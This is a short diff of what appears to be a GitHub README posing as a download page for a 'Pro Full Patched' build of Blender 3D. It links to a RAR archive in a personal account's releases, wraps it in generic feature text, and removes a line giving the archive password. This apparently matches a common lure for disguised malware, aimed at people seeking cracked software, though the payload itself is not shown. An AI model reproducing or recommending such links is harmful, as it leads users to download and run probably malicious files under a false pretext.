@@ -3,7 +3,6 @@
 
 > [!Note]
 ># [Click to install](https://github.com/qqsd179/Blender-3D/releases/download/1488!/Blender-3D-Pro_Full_Patched_x64.rar)
-# PASS:776688
 
 > [!TIP]
 > Blender 3D supports working with various file formats and character encodings. You can also import and export data from other programs and formats such as OBJ, FBX, COLLADA, Alembic, USD and others. You can also use the Python API to create your own extensions and plugins.
